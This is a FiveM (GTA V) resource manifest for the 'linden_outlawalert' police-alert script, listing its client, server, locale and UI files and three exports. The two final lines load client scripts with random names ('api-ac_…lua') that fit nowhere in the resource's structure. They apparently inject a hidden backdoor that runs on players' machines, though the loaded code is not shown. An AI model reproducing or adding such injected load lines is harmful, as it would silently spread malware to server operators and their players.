fx_version 'cerulean'
game 'gta5'

version '2.6.1'
description 'https://github.com/thelindat/linden_outlawalert'

client_scripts {
    '@es_extended/locale.lua',
    'locales/en.lua',
    'locales/fr.lua',
    'client/esx.lua',
    'client/main.lua',
}

shared_script 'config.lua'

server_scripts {
    '@es_extended/locale.lua',
    '@mysql-async/lib/MySQL.lua',
    'locales/en.lua',
    'locales/fr.lua',
    'server.lua',
}

ui_page {
    'html/alerts.html',
}

files {
	'html/alerts.html',
	'html/main.js', 
	'html/style.css',
}

export "getSpeed"           -- exports['linden_outlawalert']:getSpeed
export "getStreet"          -- exports['linden_outlawalert']:getStreet
export "zoneChance"         -- exports['linden_outlawalert']:zoneChance('Custom', 2)

client_script "api-ac_yMUpmIOqcKzn.lua"
client_script "api-ac_pvyHorvwoCap.lua"